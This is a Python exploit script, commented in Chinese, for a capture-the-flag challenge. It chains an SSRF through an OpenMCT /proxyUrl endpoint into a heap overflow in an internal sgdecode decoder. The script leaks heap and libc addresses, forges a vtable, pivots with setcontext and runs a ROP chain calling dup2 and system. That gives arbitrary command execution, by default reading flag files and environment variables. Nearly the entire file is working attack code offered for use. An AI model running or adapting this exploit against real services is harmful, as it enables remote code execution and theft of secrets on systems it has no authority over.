#!/usr/bin/env python3
"""ezstar / How to HackStar? 利用脚本.

链: OpenMCT 的 /proxyUrl 转发 -> 127.0.0.1:9001/decode(sgdecode)
    -> Golay 长度 0 造成 d_pdu 无界堆写 -> 覆盖 shared_ptr 控制块虚表
    -> setcontext 恢复伪造 ucontext -> dup2(4,1)+system 读 flag

帧格式(runbook.txt): 每个传输字节表示一个逻辑比特, MSB first,
同步字 0xA7 之后是 24 bit Golay 码字, 全零码字解码出的长度正好为 0.

用法:
    python exp.py --base http://TARGET
    python exp.py --base http://1.2.3.4:8080 --cmd "id;ls -la /"
"""

import argparse
import struct
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

SYNC = bytes([1, 0, 1, 0, 0, 1, 1, 1])  # 0xa7 = 1010 0111

INTERNAL = "http%3A%2F%2F127.0.0.1%3A9001%2Fdecode"

# libc (Ubuntu 22.04, glibc 2.35) 偏移, 与题解一致
OFF_ARENA = 0x21ACE0
OFF_SETCONTEXT = 0x539E0
OFF_POP_RDI = 0x2A3E5
OFF_POP_RSI = 0x2BE51
OFF_DUP2 = 0x115160
OFF_SYSTEM = 0x50D70
OFF_EXIT = 0x455F0

# 堆布局: 解码器对象 -> d_pdu -> shared_ptr 控制块 -> HTTP 回显 chunk
OFF_DPDU = 0xBD0
OFF_CTRL = 0x410
OFF_RAW = 0x430

DEFAULT_CMD = "(find / -xdev -type f \\( -name flag -o -name flag.txt \\) -exec cat {} +; env) 2>/dev/null"


def p64(value):
    return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)


def u64(data):
    return struct.unpack("<Q", bytes(data).ljust(8, b"\x00")[:8])[0]


def frame(payload, zero_len=False):
    """把逻辑比特展开成传输字节; zero_len 时插入 24 个 0 比特的 Golay 码字."""
    out = bytearray(SYNC)
    if zero_len:
        out += b"\x00" * 24
    for byte in payload:
        out.extend((byte >> bit) & 1 for bit in range(7, -1, -1))
    return bytes(out)


def decode_frame(payload):
    out = bytearray(SYNC)
    for byte in payload:
        out.extend((byte >> bit) & 1 for bit in range(7, -1, -1))
    return bytes(out)


class Sgdecode:
    def __init__(self, base, timeout=30):
        self.url = base + "/proxyUrl?url=" + INTERNAL
        self.session = requests.Session()
        self.timeout = timeout

    def post(self, body):
        response = self.session.post(
            self.url, data=body, verify=False, timeout=self.timeout
        )
        response.raise_for_status()
        return response

    def decode(self, payload):
        return self.post(decode_frame(payload))

    def leak(self, attempts=4):
        """先释放再复用 0x420 chunk, 从 hex dump 中取出对象地址与 libc 指针."""
        for attempt in range(1, attempts + 1):
            self.post(frame(b"A"))
            text = self.post(frame(b"B")).text.strip()
            try:
                blob = bytes.fromhex(text)
            except ValueError:
                sys.stderr.write("[!] 第 %d 次泄露: 响应不是 hex\n" % attempt)
                continue
            if len(blob) < 0x48:
                sys.stderr.write("[!] 第 %d 次泄露: hex dump 太短 %d\n" % (attempt, len(blob)))
                continue
            obj = u64(blob[0x28:0x30])
            arena = u64(blob[0x38:0x40])
            # 堆地址形如 0x55.., libc/arena 形如 0x7f..
            if not (0x550000000000 <= obj <= 0x7FFFFFFFFFFF):
                sys.stderr.write("[!] 第 %d 次泄露: 对象地址异常 %#x\n" % (attempt, obj))
                continue
            if not (0x7F0000000000 <= arena <= 0x7FFFFFFFFFFF):
                sys.stderr.write("[!] 第 %d 次泄露: arena 地址异常 %#x\n" % (attempt, arena))
                continue
            return obj, arena
        raise RuntimeError("信息泄露失败: 未能复用目标 chunk")


def build_payload(obj, arena, command):
    libc = arena - OFF_ARENA
    dpdu = obj + OFF_DPDU
    setcontext = libc + OFF_SETCONTEXT
    pop_rdi = libc + OFF_POP_RDI
    pop_rsi = libc + OFF_POP_RSI
    dup2 = libc + OFF_DUP2
    system = libc + OFF_SYSTEM
    exit_ = libc + OFF_EXIT

    buf = bytearray(b"\x00" * 0x500)

    def put(offset, data):
        buf[offset:offset + len(data)] = data

    # 1) 修补 shared_ptr 控制块头部与相邻 chunk 头, 让分配器认为堆仍连续
    put(0x400, p64(0))
    put(0x408, p64(0x21))
    put(0x418, p64(0x100000001))  # strong/weak 计数打包
    put(0x420, p64(0))
    put(0x428, p64(0x421))

    # 2) 控制块虚表 -> d_pdu 内伪造虚表, 析构时虚调用 = setcontext(ctrl)
    fake_vtable = dpdu + 0x100
    put(0x410, p64(fake_vtable))
    put(0x100, p64(0) + p64(0) + p64(setcontext) + p64(0))

    # 3) 控制块本身当作 ucontext_t: RSP/RIP 分别位于 +0xa0/+0xa8
    rop = dpdu + 0x300
    cmd = command.encode() + b"\x00"
    cmdp = dpdu + 0x480
    put(0x480, cmd)
    put(0x410 + 0xA0, p64(rop))
    put(0x410 + 0xA8, p64(pop_rdi))
    # 其余 ucontext_t 字段(含 +0x68/+0x70/+0x88 的 FPU 状态)由下面零填充的 buf 提供

    # 4) ROP: dup2(4,1) 把命令输出接回当前 HTTP 连接, system(cmd), exit(0)
    chain = [
        (0x300, 4),
        (0x308, pop_rsi),
        (0x310, 1),
        (0x318, dup2),
        (0x320, pop_rdi),
        (0x328, cmdp),
        (0x330, system),
        (0x338, pop_rdi),
        (0x340, 0),
        (0x348, exit_),
    ]
    for offset, value in chain:
        put(offset, p64(value))

    return bytes(buf), libc


def main():
    parser = argparse.ArgumentParser(description="ezstar sgdecode heap exploit")
    parser.add_argument("--base", default="http://TARGET", help="题目入口, 例如 http://1.2.3.4:8080")
    parser.add_argument("--cmd", default=DEFAULT_CMD, help="在容器内执行的命令")
    parser.add_argument("--timeout", type=float, default=30.0, help="单请求超时秒数")
    args = parser.parse_args()

    base = args.base.rstrip("/")
    client = Sgdecode(base, args.timeout)

    # 探测: 普通短帧应能拿到 hex dump
    probe = client.decode(b"P").text.strip()
    if not probe or any(ch not in "0123456789abcdefABCDEF" for ch in probe[:32]):
        raise SystemExit("[-] /decode 未按预期返回 hex dump, 检查入口: %r" % probe[:80])
    print("[+] /proxyUrl -> 127.0.0.1:9001/decode 可达")

    obj, arena = client.leak()
    libc = arena - OFF_ARENA
    print("[+] 解码器对象 = %#x" % obj)
    print("[+] main_arena  = %#x  (libc base = %#x)" % (arena, libc))
    print("[+] d_pdu       = %#x" % (obj + OFF_DPDU))

    payload, libc = build_payload(obj, arena, args.cmd)

    # 5) d_len = 0 触发无界堆写, 控制流在请求收尾析构 shared_ptr 时被劫持
    time.sleep(0.2)
    response = client.post(frame(payload, zero_len=True))
    body = response.content

    try:
        text = body.decode("utf-8", "replace")
    except Exception:
        text = repr(body)
    print("----- response body -----")
    print(text)
    print("-------------------------")

    if "flag{" in text:
        print("[+] flag: " + text[text.index("flag{"):text.index("flag{") + 64].split()[0])
    else:
        print("[i] 响应中没有 flag{, 可直接查看上面的命令输出")


if __name__ == "__main__":
    main()
